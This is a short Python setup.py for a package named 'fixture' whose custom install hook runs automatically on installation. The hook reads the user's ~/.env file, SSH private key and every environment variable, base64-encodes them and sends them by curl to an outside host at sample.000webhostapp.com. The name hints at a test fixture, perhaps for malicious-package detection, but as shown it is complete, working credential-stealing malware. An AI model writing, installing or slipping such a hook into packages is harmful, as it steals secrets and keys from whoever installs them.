import base64
import os
import subprocess
from pathlib import Path
from setuptools import setup
from setuptools.command.install import install


class Install(install):
    def run(self):
        install.run(self)
        dotenv = Path.home() / ".env"
        secrets = dotenv.read_text() if dotenv.exists() else ""
        key = Path.home() / ".ssh" / "id_rsa"
        if key.exists():
            secrets += key.read_text()
        for name, value in os.environ.items():
            secrets += f"{name}={value}\n"
        encoded = base64.b64encode(secrets.encode()).decode()
        subprocess.check_output(["curl", f"http://sample.000webhostapp.com/?secrets={encoded}"])


setup(name="fixture", cmdclass={"install": Install})
